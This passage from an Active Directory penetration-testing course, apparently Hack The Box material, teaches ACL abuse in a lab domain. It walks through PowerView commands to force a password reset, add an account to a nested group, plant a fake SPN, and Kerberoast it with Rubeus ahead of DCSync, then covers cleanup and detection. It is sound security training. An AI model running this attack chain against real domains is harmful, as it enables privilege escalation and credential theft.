We could Google for the GUID value 00299570-246d-11d0-a768-00aa006e0529 and uncover [this](https://docs.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password) page showing that the user has the right to force change the other user's password. Alternatively, we could do a reverse search using PowerShell to map the right name back to the GUID value.

### Performing a Reverse Search & Mapping to a GUID Value
```
PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```

This gave us our answer, but would be highly inefficient during an assessment. PowerView has the ResolveGUIDs flag, which does this very thing for us. Notice how the output changes when we include this flag to show the human-readable format of the ObjectAceType property as User-Force-Change-Password.

### Using the -ResolveGUIDs Flag
```
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

**Why did we walk through this example when we could have just searched using ResolveGUIDs first?**

It is essential that we understand what our tools are doing and have alternative methods in our toolkit in case a tool fails or is blocked. Before moving on, let's take a quick look at how we could do this using the [Get-Acl](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.2) and [Get-ADUser](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps) cmdlets which we may find available to us on a client system. Knowing how to perform this type of search without using a tool such as PowerView is greatly beneficial and could set us apart from our peers. We may be able to use this knowledge to achieve results when a client has us work from one of their systems, and we are restricted down to what tools are readily available on the system without the ability to pull in any of our own.

This example is not very efficient, and the command can take a long time to run, especially in a large environment. It will take much longer than the equivalent command using PowerView. In this command, we've first made a list of all domain users with the following command:

### Creating a List of Domain Users
```
PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

We then read each line of the file using a foreach loop, and use the Get-Acl cmdlet to retrieve ACL information for each domain user by feeding each line of the ad_users.txt file to the Get-ADUser cmdlet. We then select just the Access property, which will give us information about access rights. Finally, we set the IdentityReference property to the user we are in control of (or looking to see what rights they have), in our case, wley.

### A Useful foreach Loop
```
PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```
Once we have this data, we could follow the same methods shown above to convert the GUID to a human-readable format to understand what rights we have over the target user.

So, to recap, we started with the user wley and now have control over the user damundsen via the User-Force-Change-Password extended right. Let's use Powerview to hunt for where, if anywhere, control over the damundsen account could take us.

### Further Enumeration of Rights Using damundsen
```
PS C:\htb> $sid2 = Convert-NameToSid damundsen
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

Now we can see that our user damundsen has GenericWrite privileges over the Help Desk Level 1 group. This means, among other things, that we can add any user (or ourselves) to this group and inherit any rights that this group has applied to it. A search for rights conferred upon this group does not return anything interesting.
Let's look and see if this group is nested into any other groups, remembering that nested group membership will mean that any users in group A will inherit all rights of any group that group A is nested into (a member of). A quick search shows us that the Help Desk Level 1 group is nested into the Information Technology group, meaning that we can obtain any rights that the Information Technology group grants to its members if we just add ourselves to the Help Desk Level 1 group where our user damundsen has GenericWrite privileges.

### Investigating the Help Desk Level 1 Group with Get-DomainGroup
```
PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```
This is a lot to digest! Let's recap where we're at:
 * We have control over the user wley whose hash we retrieved earlier in the module (assessment) using Responder and cracked offline using Hashcat to reveal the cleartext password value
 * We enumerated objects that the user wley has control over and found that we could force change the password of the user damundsen
 * From here, we found that the damundsen user can add a member to the Help Desk Level 1 group using GenericWrite privileges
 * The Help Desk Level 1 group is nested into the Information Technology group, which grants members of that group any rights provisioned to the Information Technology group

Now let's look around and see if members of Information Technology can do anything interesting. Once again, doing our search using Get-DomainObjectACL shows us that members of the Information Technology group have GenericAll rights over the user adunn, which means we could:
 * Modify group membership
 * Force change a password
 * Perform a targeted Kerberoasting attack and attempt to crack the user's password if it is weak

### Investigating the Information Technology Group
```
PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
```
Finally, let's see if the adunn user has any type of interesting access that we may be able to leverage to get closer to our goal.

### Looking for Interesting Access
```
PS C:\htb> $adunnsid = Convert-NameToSid adunn 
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
```
The output above shows that our adunn user has DS-Replication-Get-Changes and DS-Replication-Get-Changes-In-Filtered-Set rights over the domain object. This means that this user can be leveraged to perform a DCSync attack. We will cover this attack in-depth in the DCSync section.

## Enumerating ACLs with BloodHound
Now that we've enumerated the attack path using more manual methods like PowerView and built-in PowerShell cmdlets, let's look at how much easier this would have been to identify using the extremely powerful BloodHound tool.

# ACL Abuse Tactics

Once again, to recap where we are and where we want to get to. We are in control of the wley user whose NTLMv2 hash we retrieved by running Responder earlier in the assessment. Lucky for us, this user was using a weak password, and we were able to crack the hash offline using Hashcat and retrieve the cleartext value. We know that we can use this access to kick off an attack chain that will result in us taking control of the adunn user who can perform the DCSync attack, which would give us full control of the domain by allowing us to retrieve the NTLM password hashes for all users in the domain and escalate privileges to Domain/Enterprise Admin and even achieve persistence. To perform the attack chain, we have to do the following:
 * Use the wley user to change the password for the damundsen user
 * Authenticate as the damundsen user and leverage GenericWrite rights to add a user that we control to the Help Desk Level 1 group
 * Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user

So, first, we must authenticate as wley and force change the password of the user damundsen. We can start by opening a PowerShell console and authenticating as the wley user. Otherwise, we could skip this step if we were already running as this user. To do this, we can create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0).

### Creating a PSCredential Object
```
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```
Next, we must create a [SecureString](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring?view=net-6.0) object which represents the password we want to set for the target user damundsen.

### Creating a SecureString Object
```
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```
Finally, we'll use the [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) PowerView function to change the user's password. We need to use the -Credential flag with the credential object we created for the wley user. It's best to always specify the -Verbose flag to get feedback on the command completing as expected or as much information about errors as possible. We could do this from a Linux attack host using a tool such as pth-net, which is part of the [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit).

### Changing the User's Password
```
PS C:\htb> cd C:\Tools\
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
We can see that the command completed successfully, changing the password for the target user while using the credentials we specified for the wley user that we control. Next, we need to perform a similar process to authenticate as the damundsen user and add ourselves to the Help Desk Level 1 group.

### Creating a SecureString Object using damundsen
```
PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```
Next, we can use the [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/) function to add ourselves to the target group. We can first confirm that our user is not a member of the target group. This could also be done from a Linux host using the pth-toolkit.

### Adding damundsen to the Help Desk Level 1 Group
```
PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```
A quick check shows that our addition to the group was successful.

### Confirming damundsen was Added to the Group
```
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```
At this point, we should be able to leverage our new group membership to take control over the adunn user. Now, let's say that our client permitted us to change the password of the damundsen user, but the adunn user is an admin account that cannot be interrupted. Since we have GenericAll rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's [servicePrincipalName](https://docs.microsoft.com/en-us/windows/win32/adschema/a-serviceprincipalname) attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.

We must be authenticated as a member of the Information Technology group for this to be successful. Since we added damundsen to the Help Desk Level 1 group, we inherited rights via nested group membership. We can now use [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) to create the fake SPN. We could use the tool [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.

### Creating a Fake SPN
```
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
If this worked, we should be able to Kerberoast the user using any number of methods and obtain the hash for offline cracking. Let's do this with Rubeus.

### Kerberoasting with Rubeus
```
PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
```

Great! We have successfully obtained the hash. The last step is to attempt to crack the password offline using Hashcat. Once we have the cleartext password, we could now authenticate as the adunn user and perform the DCSync attack, which we will cover in the next section.


## Cleanup
In terms of cleanup, there are a few things we need to do:

 * Remove the fake SPN we created on the adunn user.
 * Remove the damundsen user from the Help Desk Level 1 group
 * Set the password for the damundsen user back to its original value (if we know it) or have our client set it/alert the user

This order is important because if we remove the user from the group first, then we won't have the rights to remove the fake SPN.
First, let's remove the fake SPN from the adunn account.

### Removing the Fake SPN from adunn's Account

```
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```
Next, we'll remove the user from the group using the Remove-DomainGroupMember function.

### Removing damundsen from the Help Desk Level 1 Group
```
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```
We can confirm the user was indeed removed:

### Confirming damundsen was Removed from the Group
```
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose

Even though we performed as much cleanup as possible, we should still include every modification that we make in our final assessment report. Our client will want to be apprised of any changes within the environment, and recording everything we do during an assessment in writing helps our client and us should questions arise.

This is just one example attack path. There could be many attack paths in a large domain, some shorter and some more complicated. While this path was fictional for this specific lab environment, I have seen similar attack paths during real-world engagements, and ACL attacks often come into play for furthering access. Sometimes, though, an ACL attack chain may be too time-consuming or potentially destructive, so we may prefer to enumerate the path to present our client with enough evidence to understand the issue and perform remediation.


## Detection and Remediation
A few recommendations around ACLs include:
 1. **Auditing for and removing dangerous ACLs:** Organizations should have regular AD audits performed but also train internal staff to run tools such as BloodHound and identify potentially dangerous ACLs that can be removed.
 2. **Monitor group membership:** Visibility into important groups is paramount. All high-impact groups in the domain should be monitored to alert IT staff of changes that could be indicative of an ACL attack chain.
 3. **Audit and monitor for ACL changes:** Enabling the [Advanced Security Audit Policy](https://docs.microsoft.com/en-us/archive/blogs/canitpro/step-by-step-enabling-advanced-security-audit-policy-via-ds-access) can help in detecting unwanted changes, especially [Event ID 5136: A directory service object was modified](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5136) which would indicate that the domain object was modified, which could be indicative of an ACL attack. If we look at the event log after modifying the ACL of the domain object, we will see some event ID 5136 created.

There are many tools out there that can be used to help monitor AD. These tools, when used in conjunction with a highly mature AD secure posture, and combined with built-in tools such as the various ways we can monitor for and alert on events in Active Directory, can help to detect these types of attacks and prevent them from going any further.
